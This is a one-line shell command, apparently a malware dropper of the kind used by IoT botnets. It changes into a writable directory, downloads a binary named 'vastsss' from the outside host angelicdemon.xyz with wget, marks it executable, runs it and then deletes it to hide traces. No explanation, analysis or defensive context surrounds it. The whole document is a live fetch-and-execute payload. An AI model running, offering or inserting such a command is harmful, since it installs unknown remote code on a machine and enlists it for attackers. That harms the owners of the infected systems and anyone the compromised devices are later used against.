cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://angelicdemon.xyz/vastsss; chmod +x vastsss; ./vastsss; rm -rf vastsss
